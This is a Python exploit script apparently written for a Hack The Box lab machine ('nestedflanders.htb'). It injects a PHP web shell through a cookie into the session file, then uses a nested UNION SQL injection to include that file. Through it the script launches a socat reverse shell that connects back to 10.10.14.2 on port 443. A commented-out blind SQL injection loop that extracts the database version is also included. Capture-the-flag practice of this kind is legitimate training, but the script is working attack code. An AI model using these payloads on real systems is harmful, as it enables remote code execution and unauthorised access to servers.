#!/usr/bin/env python3

import requests
import string
import sys
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = "https://www.nestedflanders.htb/index.php"

session.get(url, verify=False, proxies=proxies)

cookieFileName = "/var/lib/php/sessions/sess_" + session.cookies['PHPSESSID']

# Inject PHP on logs

webshellCookie = {'shell':"<%3fphp+system($_GET['cmd'])%3b+%3f>"}

session.get(url, verify=False, proxies=proxies, cookies=webshellCookie)

injection = "587' and 1=2 UNION select '0xdf\\' union select \\'%s\'-- -" % cookieFileName

os.popen("socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr")

params = {"cmd":"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:443", "id": injection}

session.get(url, verify=False, proxies=proxies, params=params)

'''
# Enumerating DB with Blind SQL Injection
i = 1
while True:
    done = True
    for c in string.printable[:-10]:
        param = {"id": f"587' and substring(@@version,{i},1)='{c}'-- -"}
        resp = requests.get("https://www.nestedflanders.htb/index.php", params=param, verify=False, proxies=proxies)
        # print(i)
        if not "2001" in resp.text:
            sys.stdout.write(c)
            sys.stdout.flush()
            i += 1
            done = False
            break
    if done:
        break
'''


